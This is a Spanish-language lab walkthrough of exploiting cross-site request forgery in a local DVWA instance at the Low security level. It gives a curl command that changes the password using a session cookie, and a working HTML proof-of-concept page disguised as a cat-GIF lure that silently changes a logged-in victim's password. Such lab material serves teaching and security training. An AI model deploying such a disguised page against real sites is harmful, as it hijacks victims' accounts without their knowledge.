# Cross-Site Request Forgery (CSRF) en DVWA

## 🧩 1 ¿Qué es CSRF?

- **CSRF:** Es un ataque que fuerza al navegador de una víctima autenticada a ejecutar una acción en un sitio donde está logueada (cambiar contraseña, email...) sin la intención de dicha víctima.
- No necesita leer la respuesta; solo que el navegador envíe la petición con las ***cookies de sesión*** de la víctima.

## Conceptos clave 

- **Estado (state-changing):** Acción que modifica algo en el servidor (ej: cambiar contraseña).
- **Anti-CSRF token:** Valor secreto, impredecible, por solicitud, que el servidor incluye en el formulario y valida al recibirlo.
- **SameSite cookie:** Atributo de cookie (SameSite-Lax/Strict/None) que controla si la cookie se envía en peticiones cross-site (mitiga muchos CSRF).
- **Referer / Origin:** Cabeceras que indican de dónde viene la petición; algunos sitios las validan para mitigar CSRF (defensa débil si se usa sola).
- **Double-submit cookie:** Patrón defensivo que envía el token tanto en cookie como en cuerpo/cabecera y el servidor compara ambos.

## 2 Objetivo en DVWA

DVWA tiene un módulo CSRF que permite cambiar la contraseña del usuario actual. Vamos a:

1. Confirmar el cambio de contraseña con curl (Low).
2. Construir un **PoC HTML** que, al visitarlo la víctima logueada, cambia su contraseña.
3. Explorar Medium/High y evidenciar qué controles aparecen.
4. Documentar mitigaciones.

## 3 Recolección inicial

### 3.1 Obtenemos cookie de sesión manualmente:

- Iniciamos sesión en DVWA desde el navegador.
- Abrimos las herramientas de desarrollador (F12 → pestaña "Aplicación" o "Storage").
- Copiamos el valor de PHPSESSID.

### 3.2 Obtenemos cookie de sesión por la terminal:

- Abrimos nuestra terminal y ejecutamos el siguiente comando en Bash, el cual nos ofrecerá toda la información, incluida la cookie:

```bash
# Ver cookies y sus atributos (SameSite, HttpOnly, Secure)
curl -I http://127.0.0.1:8080 | grep -i set-cookie
```

<img width="640" height="145" alt="imagen" src="https://github.com/user-attachments/assets/84e4ccd4-d3a3-4ace-ae6f-28fe16264cec" />


Abre DVWA → CSRF y mira el formulario de "Change Password". En Low, suele aceptar GET sin token.

<img width="678" height="361" alt="imagen" src="https://github.com/user-attachments/assets/b55c6395-bd50-48be-8c95-f158953dd072" />

## 4 Explotación -- Nivel LOW

### 🔐 4.1. Cambiar contraseña con curl (GET).

#### 📌 Objetivo

Enviar una petición GET a DVWA para cambiar la contraseña del usuario actual a pepito, sin usar el formulario web, sino desde la terminal.

#### 🛠️ Paso a paso

1. Ejecutamos en la terminal el siguiente comando en consola:

```bash
curl -i "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=pepito&password_conf=pepito&Change=Change" \
  --cookie "PHPSESSID=e4461uipj20cvits72f6mmeh36; security=low"
```

##### 🔍 Explicación del comando:

- curl-l: muestra encabezados HTTP + contenido.
- URL: contiene los parámetros GET para cambiar la contraseña.
- --cokie: simula que estás logueado, enviando tu sesión activa.

Verificamos la respuesta:

- Debemos ver HTTP/1.1 200 OK
- En el cuerpo, buscamos: Password Changed.


<img width="922" height="215" alt="imagen" src="https://github.com/user-attachments/assets/834830d6-98f2-4d16-82fb-5d0929f177e8" />

<img width="755" height="306" alt="imagen" src="https://github.com/user-attachments/assets/e5ad0e7b-a9a9-458f-a759-85fff06128e7" />


Confirmamos el cambio:

- Vamos al login de DVWA para volver a iniciar sesión.
- Usamos el usuario original con el que la víctima estaba autenticada (en este caso admin) y probamos la nueva contraseña: pepito.
- Confirmamos que podemos entrar con las nuevas credenciales.


### 🧨 4.2 PoC HTML (auto-CSRF)

#### 📌 Objetivo

Crear una página maliciosa que, al ser visitada por un usuario logueado en DVWA, le ***cambie la contraseña automáticamente*** sin que se dé cuenta.

#### 🛠️ Paso a paso

1. Usamos un editor de texto como **nano** y creamos el archivo:

```bash
nano ~/Pentesting/DVWA/exploits/dvwa_csrf_low_poc.html
```

Si la carpeta Pentesting/DVWA/exploits no existe, la creamos antes con:

```
mkdir -p ~/Pentesting/DVWA/exploits
```

2. Una vez dentro del editor de texto nano, creamos la página HTML:

```html
<!doctype html>
<html>
  <body onload="document.images[0].src='http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change'">
    <img style="display:none" alt="">
    <h1>😺 Mira este GIF de gatitos</h1>
  </body>
</html>
```

Guardamos el archivo con Ctrl + O, pulsamos Enter y salimos con Ctrl + X.

🧾 Explicación del HTML 

```html
<!doctype html>
<html>
```

- <!doctype html>: Indica que el documento usa HTML5.
- <html>: Comienza el contenido HTML de la página.

```html
<body onload="document.images[0].src='http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change'">
```

- <body>: Contiene el contenido visible (y funcional) de la página.
- onload="...": Ejecuta el código JavaScript cuando la página termina de cargar.
- document.images[0].src = ...:
  - Accede a la primera imagen (<img>) del documento.
  - Le asigna una URL como fuente (src), lo que provoca que el navegador haga una petición      GET a esa URL.
  - La URL apunta a DVWA y contiene parámetros para cambiar la contraseña:
    - password_new=hacked: nueva contraseña.
    - password_conf=hacked: confirmación de la nueva contraseña.
    - Change=Change: valor del botón de envío.

⚠️ Aunque parece que se está cargando una imagen, en realidad se está disfrazando una petición maliciosa como si fuera una imagen. Esto es una técnica clásica en ataques CSRF.

```html
<img style="display:none" alt="">
```

- Crea una imagen invisible:
  - style="display:none": oculta la imagen para que el usuario no la vea.
  - alt="": texto alternativo vacío.
- Esta imagen es la que se usa para lanzar la petición GET al servidor vulnerable.

```html
<h1>😺 Mira este GIF de gatitos</h1>
```

- Texto visible en la página.
- Sirve como distracción o anzuelo para que el usuario cargue la página sin sospechar.

```html
</body>
</html>
```

- Cierre de las etiquetas body y html.

🧠 ¿Qué hace este HTML en conjunto?

- Simula una página inocente.
- Al abrirla, el navegador del usuario (si está logueado en DVWA) envía automáticamente una petición GET que cambia su contraseña.
- El usuario no ve nada sospechoso, solo un mensaje simpático.
- El atacante logra ejecutar una acción sin interacción directa del usuario.
- Como estamos en el nivel bajo de seguridad, DVWA no exige token CSRF, así que la petición debería funcionar si el usuario está logueado.

3. Levantamos un servidor web local simple y sin cifrado con python:

```bash
cd ~/Pentesting/DVWA/exploits
python3 -m http.server 9000
```

Esto crea un servidor web en http://127.0.0.1:9000.

<img width="487" height="95" alt="imagen" src="https://github.com/user-attachments/assets/e1c085ad-8e7b-4be8-bc86-738edb08d889" />

⚠️ Advertencia:

- Estos servidores no soportan https, ya que el navegador intenta negociar una conexión segura (SSL/TLS), pero el servidor no sabe como responder.

#### 📌 Explicación:

- Cuando se carga la página, el navegador hace una petición GET a DVWA.
- Como el usuario está logueado, se envía la cookie automáticamente.
- DVWA procesa el cambio de contraseña sin pedir confirmación.


3. Visitamos la página como víctima para probar el ataque:

- Asegurarnos de que estamos logueados en DVWA.
- Abrimos: http://127.0.0.1:9000/dvwa_csrf_low_poc.html

Como podemos observar en la siguiente imagen, vemos que nuestro archivo HTML creado está cargado en el navegador, lo que significa que el servidor local está funcionando correctamente.

<img width="914" height="442" alt="imagen" src="https://github.com/user-attachments/assets/881aace5-1e7d-4af9-9909-a629ab09a699" />

4. Verificamos el cambio:

- Tras ejecutar la víctima nuestra URL del HTML que creamos, el siguiente paso sería cerrar la cuenta que tenemos abierta (en este caso admin) y volver a loguearnos con la nueva contraseña hacked.

Al salir, hemos entrado con user:admin y password:hacked

<img width="961" height="855" alt="imagen" src="https://github.com/user-attachments/assets/eb19ff40-1ea6-4da4-a4ba-e7d898d7c96e" />

Por tanto, se ha hecho efectivo este PoC para robar contraseñas al usuario autenticado.

Nota: Usamos <img> porque en Low el cambio acepta GET. También valdría un <form> auto-submit si fuese POST.

### 🧠 ¿Por qué funciona esto?

En nivel low, DVWA no verifica:

- Si la petición viene del formulario legítimo.
- Si hay token CSRF.
- Si el método es seguro (acepta GET).

Por eso, cualquier petición GET con los parámetros correctos y una cookie válida puede cambiar la contraseña.
